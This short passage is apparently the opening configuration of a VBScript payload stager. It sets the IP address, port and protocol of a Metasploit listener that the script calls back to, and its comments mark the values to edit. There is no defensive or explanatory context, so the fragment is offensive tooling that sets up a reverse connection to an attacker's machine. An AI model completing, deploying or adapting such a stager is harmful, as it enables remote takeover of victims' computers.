...
Dim RHOST: RHOST = "172.16.97.1"	' <- MSF Listner IP or Hostname
Dim RPORT: RPORT = "443"			' <- MSF Listner Port
Dim UseHTTPS: UseHTTPS = "yes"		' <- Use HTTPS or plain HTTP Payloads: yes/no
